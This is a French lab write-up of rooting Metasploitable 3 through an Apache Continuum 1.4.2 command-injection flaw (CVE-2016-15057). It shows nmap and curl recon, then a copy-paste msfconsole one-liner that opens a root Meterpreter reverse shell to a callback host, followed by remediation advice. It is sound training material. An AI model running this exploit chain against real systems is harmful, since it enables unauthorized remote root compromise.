# Write-up — Apache Continuum : Arbitrary Command Execution (Metasploitable 3, port 8080)

Cible : `172.28.128.3:8080/continuum/` · CVE-2016-15057 · Résultat : shell **root** direct.

Tout ce qui suit est copier-coller direct (testé en zsh), côté 🖥 Kali uniquement.

---

## 1. Recon

```bash
nmap -sC -sV -p 8080 172.28.128.3
```
```
8080/tcp open  http    Jetty 8.1.7.v20120910
|_http-title: Error 404 - Not Found
```
Racine du serveur Jetty en 404, aucune appli visible au premier abord. `gobuster` avec une
wordlist générique ne trouve rien d'utile non plus.

**Astuce qui a débloqué la recherche :** Jetty liste lui-même ses contextes connus dans le
corps de sa page d'erreur 404 — pas besoin de deviner à l'aveugle :
```bash
curl -s http://172.28.128.3:8080/
```
```html
<H2>Error 404 - Not Found.</H2>
No context on this server matched or handled this request.<BR>Contexts known to this server are:
<li><a href="/continuum">/continuum ---> o.e.j.w.WebAppContext{/continuum,
file:/opt/apache_continuum/apache-continuum-1.4.2/apps/continuum/}</a></li>
```
**Apache Continuum 1.4.2** — nom et version donnés directement par le serveur.

## 2. Méthode d'identification de la CVE et du module

```bash
searchsploit continuum
```
```
Apache Continuum - Arbitrary Command Execution | linux/remote/39945.rb
```
```bash
msfconsole -q -x "search continuum; exit"
```
```
exploit/linux/http/apache_continuum_cmd_exec  2016-04-06  excellent  Yes
```
```bash
msfconsole -q -x "info exploit/linux/http/apache_continuum_cmd_exec; exit"
```
```
References:
  https://nvd.nist.gov/vuln/detail/CVE-2016-15057
```
**CVE-2016-15057.** Apache Continuum est un serveur d'intégration continue. Une des
fonctionnalités de configuration des outils de build (*"custom working directory"* ou
similaire selon les versions) permet d'injecter des commandes systèmes qui seront exécutées
par le serveur lors d'une build — sans validation suffisante des entrées, menant à une
exécution de commande arbitraire côté serveur, avec les droits du processus Continuum
(souvent root sur une install de démo/labo comme celle-ci).

## 3. Exploiter

```bash
msfconsole -q -x "use exploit/linux/http/apache_continuum_cmd_exec; set RHOSTS 172.28.128.3; set LHOST 172.28.128.1; set LPORT 4450; exploit -z; sessions -l; sessions -i 1 -c id; sessions -i 1 -c whoami; sessions -i 1 -c 'uname -a'; sessions -K; exit -y"
```
```
[*] Injecting CmdStager payload...
[*] Sending stage (3106788 bytes) to 172.28.128.3
[*] Meterpreter session 1 opened (172.28.128.1:4450 -> 172.28.128.3:41638)
[*] Command Stager progress - 100.00% done (823/823 bytes)

Id  Name  Type                   Information                    Connection
1         meterpreter x64/linux  root @ metasploitable3-ub1404  ...
```
Aucun obstacle rencontré — fonctionne du premier coup, contrairement à Samba et Drupal sur
cette même cible.

## 4. Preuve d'accès obtenu

```
uid=0(root) gid=0(root) groups=0(root)
root
Linux metasploitable3-ub1404 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 GNU/Linux
```
**Root direct**, premier accès root complet de ce côté du rapport pour MS3 — pas une
élévation en deux temps, le processus Continuum tournait déjà en root sur cette install.

---

## Remédiation

- Mettre à jour Apache Continuum au-delà de 1.4.2, ou migrer vers un outil de CI maintenu
  (Continuum est un projet Apache retiré depuis plusieurs années).
- Ne **jamais** faire tourner un serveur de build/CI avec les droits root — c'est la cause
  de gravité de cette CVE : même avec la faille présente, un compte dédié non privilégié
  aurait limité l'impact à ce compte, pas au système entier.
- Restreindre l'accès réseau à l'interface Continuum (VPN, pare-feu, authentification) —
  elle n'a aucune raison d'être exposée publiquement.

---

**Pour rejouer tout le scénario depuis zéro** : `./start.sh` (démarre la VM), puis les
étapes 1 à 3 dans l'ordre.

**Suite du parcours MS3 :** UnrealIRCd (port 6697, variante SSL).
